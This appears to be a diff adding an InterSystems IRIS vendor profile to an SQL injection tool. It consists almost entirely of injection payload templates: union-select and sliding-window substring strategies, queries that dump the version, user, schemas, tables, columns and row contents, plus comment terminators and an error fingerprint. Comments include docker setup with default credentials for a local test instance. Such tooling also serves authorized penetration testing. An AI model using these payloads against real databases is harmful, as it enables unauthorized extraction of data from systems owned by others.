@@ -1,0 +1,144 @@
+vendor: Iris
+# $ docker run --name my-iris -d --publish 1972:1972 --publish 52773:52773 store/intersystems/iris-community:2020.3.0.221.0
+# http://127.0.0.1:52773/csp/sys/UtilHome.csp
+# usr pwd: _SYSTEM SYS
+# Change pwd
+# jdbc:IRIS://127.0.0.1:1972/USER
+
+resource:
+ info: |
+  'version()'
+  || '${enclose_value_sql}'
+  || 'database()'
+  || '${enclose_value_sql}'
+  || 'user()'
+  || '${trail_sql}'
+
+ schema:
+  database: |
+   select 
+       coalesce(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || q
+           || '${enclose_value_sql}',
+           '${trail_sql}'
+       )
+       ||'${trail_sql}'
+   from (
+       select
+           cast(t.SCHEMA_NAME as varchar) r,
+           '0' q
+       from
+          (select distinct schema_name from information_schema.schemata) t,
+          (select distinct schema_name from information_schema.schemata) t1
+       where t.schema_name >= t1.schema_name
+       group by t.schema_name
+       ${limit}
+   ) as x
+
+  table: |
+   select 
+       coalesce(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || q
+           || '${enclose_value_sql}'
+           || '${trail_sql}',
+           '${trail_sql}'
+       )
+   from (
+       select
+           cast(t.TABLE_NAME as varchar) r,
+           '0' q
+       from
+          (select distinct table_name from information_schema.tables where table_schema = '${database}') t,
+          (select distinct table_name from information_schema.tables where table_schema = '${database}') t1
+       where t.table_name >= t1.table_name
+       group by t.table_name
+       ${limit}
+   ) x
+
+  column: |
+   select 
+       coalesce(
+           '${enclose_value_sql}'
+           || n
+           || '${separator_qte_sql}'
+           || 0
+           || '${enclose_value_sql}'
+           || '${trail_sql}',
+           '${trail_sql}'
+       )
+   from (
+       select cast(t.COLUMN_NAME as varchar) n
+       from
+          (select distinct column_name from information_schema.columns where table_schema = '${database}' and table_name = '${table}') t,
+          (select distinct column_name from information_schema.columns where table_schema = '${database}' and table_name = '${table}') t1
+       where t.column_name >= t1.column_name
+       group by t.column_name
+       ${limit}
+   ) x
+
+  row:
+   query: |
+    select coalesce(
+        '${enclose_value_sql}'
+        || r
+        || '${separator_qte_sql}'
+        || q
+        || '${enclose_value_sql}'
+        || '${trail_sql}',
+        '${trail_sql}'
+    ) from (
+        select
+            cast(t.s as varchar) r,
+            cast(count(*) as varchar) q
+        from
+           (select distinct ${fields} s from ${database}.${table}) t,
+           (select distinct ${fields} s from ${database}.${table}) t1
+        where t.s >= t1.s
+        group by t.s
+        ${limit}
+    ) x
+   fields:
+    field: trim(coalesce(${field.value}, ''))
+    concat: "||'%7f'||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           '${lead}'
+           || substr(
+               (${injection}),
+               ${window.char},
+               ${capacity}
+           )
+   )
+  limit: having count(*) between ${limit.value} and ${limit.value}
+  failsafe: 1337${indice}7330%2b1
+  calibrator: repeat('${calibrator_sql}', 65536)
+  limitBoundary: 1
+  # Encoded space mandatory to avoid space cleaning
+  # TODO keep raw space
+  # endingComment: --+-
+  # pentesterlab does not work with --+-, switch to #
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - intersystems iris
+
+ normal:
+  indices: union select ${indices}
+  capacity: |
+   (
+       select 
+           '${lead}'
+           || ${indice}
+           || ${calibrator}
+   )
+  orderBy: order by 1337
